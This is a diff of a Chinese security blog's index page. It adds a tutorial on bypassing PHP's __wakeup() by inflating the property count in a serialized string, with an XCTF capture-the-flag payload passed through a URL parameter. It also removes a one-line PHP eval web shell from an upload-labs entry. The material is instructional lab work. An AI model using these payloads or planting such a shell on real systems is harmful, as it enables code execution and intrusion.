@@ -167,10 +167,66 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#PHP反序列化#</p>
-        
-          <a class="article-more-a" href="/2020/03/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more">more >></a>
-        
+        <a id="more"></a>
+<p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
+<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
+<p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
+<p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
+<p>举例说明</p>
+<pre><code>&lt;?php
+class Student{
+public $full_name = &apos;zhangsan&apos;;
+public $score = 150;
+public $grades = array();
+
+function __wakeup() {
+echo &quot;__wakeup is invoked&quot;;
+}
+}
+
+$s = new Student();
+var_dump(serialize($s));
+?&gt;</code></pre><hr>
+<pre><code>O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}</code></pre><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
+<p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
+<p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
+<p>最后执行运行的代码如下:</p>
+<pre><code>&lt;?php
+class Student{
+public $full_name = &apos;zhangsan&apos;;
+public $score = 150;
+public $grades = array();
+
+function __wakeup() {
+echo &quot;__wakeup is invoked&quot;;
+}
+function __destruct() {
+var_dump($this);
+}
+}
+
+$s = new Student();
+$stu = unserialize(&apos;O:7:&quot;Student&quot;:5:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}&apos;);
+?&gt;</code></pre><h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>题目</p>
+<pre><code>class xctf{
+public $flag = &apos;111&apos;;
+public function __wakeup(){
+exit(&apos;bad requests&apos;);
+}
+?code=</code></pre><hr>
+<pre><code>&lt;?php
+class xctf{  //定义一个名为xctf的类
+public $flag = &apos;111&apos;;//定义一个公有的类属性$flag，值为111
+public function __wakeup(){  //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本
+exit(&apos;bad requests&apos;);
+}
+}
+$test = new xctf();   //使用new运算符来实例化该类（xctf）的对象为test
+echo(serialize($test));   //输出被序列化的对象（test）
+?&gt;</code></pre><p>输出结果</p>
+<pre><code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
+<pre><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+
       
 
       
@@ -297,9 +353,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="uplad-labs"><a href="#uplad-labs" class="headerlink" title="uplad-labs"></a>uplad-labs</h1><p>一句话木马</p>
-<p> <code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;]); ?&gt;</code></p>
-<p>文件名shell.php</p>
+        <h1 id="uplad-labs"><a href="#uplad-labs" class="headerlink" title="uplad-labs"></a>uplad-labs</h1>
         
           <a class="article-more-a" href="/2020/03/29/upload-labs/#more">more >></a>
         
